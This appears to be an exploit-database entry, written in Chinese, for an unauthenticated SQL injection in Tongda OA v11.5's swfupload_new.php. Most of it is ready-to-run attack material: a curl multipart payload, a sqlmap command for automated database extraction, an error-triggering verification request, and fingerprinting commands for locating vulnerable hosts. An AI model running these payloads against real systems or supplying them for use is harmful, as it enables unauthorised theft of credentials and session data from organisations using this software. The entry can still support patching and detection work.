---
id: TONGDA-SWFUPLOAD-SQLI
title: 通达OA v11.5 swfupload_new.php SQL注入漏洞
product: tongda-oa
vendor: 通达信科
version_affected: "通达OA v11.5"
severity: HIGH
tags: [sqli, 无需认证, 国产, oa]
fingerprint: ["通达OA", "TDXK", "Office Anywhere"]
---

## 漏洞描述

通达OA v11.5 的 swfupload_new.php 文件存在 SQL 注入漏洞，攻击者无需认证即可通过构造恶意请求注入 SQL 语句，获取数据库中的敏感信息（用户凭据、session 等）。

## 影响版本

- 通达OA v11.5

## 前置条件

- 无需认证
- 目标运行通达OA v11.5

## 利用步骤

1. 确认目标为通达OA v11.5
2. 构造包含 SQL 注入的 Multipart 请求
3. 发送到 `/general/file_folder/swfupload_new.php`
4. 利用注入获取数据库信息

## Payload

```bash
curl -s "http://target/general/file_folder/swfupload_new.php" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----------Boundary" \
  -d '------------Boundary
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------Boundary
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------Boundary
Content-Disposition: form-data; name="FILE_SORT"

2
------------Boundary
Content-Disposition: form-data; name="SORT_ID"


------------Boundary--'
```

**SQLmap 自动化利用**

```bash
# 将请求保存为文件后使用 sqlmap
sqlmap -u "http://target/general/file_folder/swfupload_new.php" \
  --data="ATTACHMENT_ID=1&ATTACHMENT_NAME=1&FILE_SORT=2&SORT_ID=" \
  --batch --dbms=mysql
```

## 验证方法

```bash
# 发送请求检查是否触发 SQL 错误
curl -s "http://target/general/file_folder/swfupload_new.php" \
  -X POST -H "Content-Type: multipart/form-data; boundary=----B" \
  -d '------B
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------B
Content-Disposition: form-data; name="FILE_SORT"

2'"'"'
------B--'
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "通达\|Office Anywhere\|TDXK"
curl -s "http://target/inc/expired.php" -o /dev/null -w "%{http_code}"
```
